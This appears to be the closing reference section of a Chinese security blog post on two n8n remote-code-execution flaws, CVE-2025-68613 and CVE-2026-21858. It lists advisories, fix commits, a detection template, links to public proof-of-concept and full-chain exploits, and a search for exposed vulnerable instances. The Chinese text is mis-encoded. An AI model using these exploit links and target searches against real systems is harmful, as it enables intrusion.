![](https://mmbiz.qpic.cn/mmbiz_png/jhBO4w8SLibWeylqTSbWVEsmQ0ia1d54BpLkf8Fe3ibSCUDcHeuS7XzRf5UTegmPXtb85mL3Uib7HtQO0j4sjaiaiaUw/640?wx_fmt=png&from=appmsg "null")  
  
## ğŸ”— å‚è€ƒèµ„æº  
### å®˜æ–¹å…¬å‘Š  
  
https://www.cve.org/CVERecord?id=CVE-2025-68613  
  
https://www.cve.org/CVERecord?id=CVE-2026-21858  
### æŠ€æœ¯åˆ†æ  
- â€¢ https://github.com/n8n-io/n8n/commit/08f332015153decdda3c37ad4fcb9f7ba13a7c79  
  
- â€¢ https://github.com/n8n-io/n8n/commit/1c933358acef527ff61466e53268b41a04be1000  
  
- â€¢ https://github.com/n8n-io/n8n/commit/39a2d1d60edde89674ca96dcbb3eb076ffff6316  
  
- â€¢ https://github.com/n8n-io/n8n/security/advisories/GHSA-v98v-ff95-f3cp  
  
- â€¢Â   
Cyera Research - Ni8mare Full Write-up[1]  
Â - Original research by Dor Attias  
  
- â€¢Â   
GHSA-v4pr-fm98-w9pg[2]  
Â - CVE-2026-21858  
  
- â€¢Â   
GHSA-v98v-ff95-f3cp[3]  
Â - CVE-2025-68613  
  
- â€¢Â   
Nuclei Template CVE-2025-68613[4]  
  
- â€¢Â   
LeakIX Search Results[5]  
Â - Exposed vulnerable instances  
  
- â€¢Â   
Formidable[6]  
Â - "The library, not the song" (thanks Cyera for the laugh)  
  
### PoC/Exploit  
  
n8n è¡¨è¾¾å¼æ²™ç®±é€ƒé€¸å¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ CVE-2025-68613[7]  
  
CVE-2026-21858 + CVE-2025-68613 - n8n Full Chain[8]  
  
ğŸ””Â **æƒ³è¦è·å–æ›´å¤šç½‘ç»œå®‰å…¨ä¸ç¼–ç¨‹æŠ€æœ¯å¹²è´§ï¼Ÿ**  
  
å…³æ³¨Â **æ³·ç¾½Sec-é™å®‰**  
Â å…¬ä¼—å·ï¼Œä¸ä½ ä¸€èµ·æ¢ç´¢å‰æ²¿æŠ€æœ¯ï¼Œåˆ†äº«å®ç”¨çš„å­¦ä¹ èµ„æºä¸å·¥å…·ã€‚æˆ‘ä»¬ä¸“æ³¨äºæ·±å…¥åˆ†æï¼Œæ‹’ç»æµ®èºï¼Œåªåšæœ€å®ç”¨çš„æŠ€æœ¯åˆ†äº«ï¼ğŸ’»  
  
é©¬ä¸ŠåŠ å…¥æˆ‘ä»¬ï¼Œå…±åŒæˆé•¿ï¼ğŸŒŸ  
  
ğŸ‘‰Â **é•¿æŒ‰æˆ–æ‰«æäºŒç»´ç å…³æ³¨å…¬ä¼—å·**  
  
ç›´æ¥å›å¤æ–‡ç« ä¸­çš„å…³é”®è¯ï¼Œè·å–æ›´å¤šæŠ€æœ¯èµ„æ–™ä¸ä¹¦å•æ¨èï¼ğŸ“š  
#### å¼•ç”¨é“¾æ¥  
  
[1]  
Â Cyera Research - Ni8mare Full Write-up:Â https://www.cyera.com/research-labs/ni8mare-unauthenticated-remote-code-execution-in-n8n-cve-2026-21858  
[2]  
Â GHSA-v4pr-fm98-w9pg:Â https://github.com/n8n-io/n8n/security/advisories/GHSA-v4pr-fm98-w9pg  
[3]  
Â GHSA-v98v-ff95-f3cp:Â https://github.com/n8n-io/n8n/security/advisories/GHSA-v98v-ff95-f3cp  
[4]  
Â Nuclei Template CVE-2025-68613:Â https://github.com/projectdiscovery/nuclei-templates/blob/main/http/cves/2025/CVE-2025-68613.yaml  
[5]  
Â LeakIX Search Results:Â https://leakix.net/search?scope=leak&q=%2Btag%3Acve-2026-21858  
[6]  
Â Formidable:Â https://github.com/node-formidable/formidable  
[7]  
Â n8n è¡¨è¾¾å¼æ²™ç®±é€ƒé€¸å¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ CVE-2025-68613:Â https://github.com/Threekiii/Awesome-POC/blob/master/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/n8n%20%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%AF%BC%E8%87%B4%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2025-68613.md#n8n-%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%AF%BC%E8%87%B4%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2025-68613  
[8]  
Â CVE-2026-21858 + CVE-2025-68613 - n8n Full Chain:Â https://github.com/Chocapikk/CVE-2026-21858#  
  
Â   
  
  
